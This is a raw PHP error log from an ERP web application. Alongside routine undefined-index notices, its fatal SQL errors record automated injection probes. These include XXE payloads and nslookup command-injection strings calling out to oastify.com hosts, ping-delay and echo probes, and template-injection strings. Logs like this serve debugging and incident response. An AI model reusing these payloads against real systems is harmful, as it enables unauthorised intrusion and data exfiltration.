[04-Jan-2023 14:29:34 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call sp_getDTMsgTrail("(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://pyr0oubnnhex8vs32vojw8j6xx3rrofr3iq8ex.oasti'||'fy.com/">%jbfab;]>'),'/l') from dual)")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://pyr0oubn' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getCommentDownTime.php(12): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call sp_getDTMsgTrail("'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://2qtdg730fu6a08kgu8gwolbjpav4j175vwim6b.oasti'||'fy.com/">%jbfab;]>'),'/l') from dual)||'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://2qtdg730' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getCommentDownTime.php(12): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://vba610ot0nr3l159f11p9ewca3gx4wszgq3gr5.oasti'||'fy.com/">%qnlgh;]>'),'/l') from dual)")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://vba610ot' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://dm3ocizbb52lwjgrqjc7kw7ullrffe3ir9ez2o.oasti'||'fy.com/">%qnlgh;]>'),'/l') from dual)||'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://dm3ocizb' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("}}vdhsb'/"<axoky")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("%}swy6z'/"<ovbpm")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("zswa7%>rgbe7'/"<t1jw8")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("'"`0&nslookup -q=cname xst8i25vhp8523mbw3irqgder5xzly9vxmkc81.oastify.com.&`'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`0&nslookup -q=cname xst8i25vhp8523mbw3irqgder5xzly9vxmkc81.oastify.com.&`'")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&'"`0&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&`'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`0&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&`'")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("|echo 8p1lb970sc j02b393h01||a #' |echo 8p1lb970sc j02b393h01||a #|" |echo 8p1lb970sc j02b393h01||a #")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '8p1lb970sc j02b393h01||a #")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""|echo mwfz990kwf j2r2wajfx7 ||")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'mwfz990kwf j2r2wajfx7 ||")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #" |ping -n 21 127.0.0.1")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
